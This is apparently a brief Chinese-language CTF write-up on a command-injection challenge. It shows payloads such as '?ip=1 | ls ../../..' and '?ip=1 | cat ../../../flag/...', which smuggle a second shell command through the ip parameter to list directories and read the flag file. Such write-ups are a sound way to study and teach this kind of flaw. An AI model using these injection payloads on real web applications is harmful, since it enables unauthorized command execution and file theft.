先用grep -ra "0ops*" 发现没有输出值，感觉grep这个指令可能被屏蔽了（要不太简单了）

后面又用find \ -name "flag*"发现返回一堆设备文件的flag（可能是输出行数有限制？，把关键的东西给删了？）

然后去搜索文件 ？ip=1 |  ls ../../..

输出以下目录：bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var

发现flag文件夹，然后输入？ip=1 | ls ../../../flag 发现文件80e20712e0fccd9dc5d6c1f7932efc57

在输入ip=1 | cat ../../../flag/80e20712e0fccd9dc5d6c1f7932efc57即可

查看flag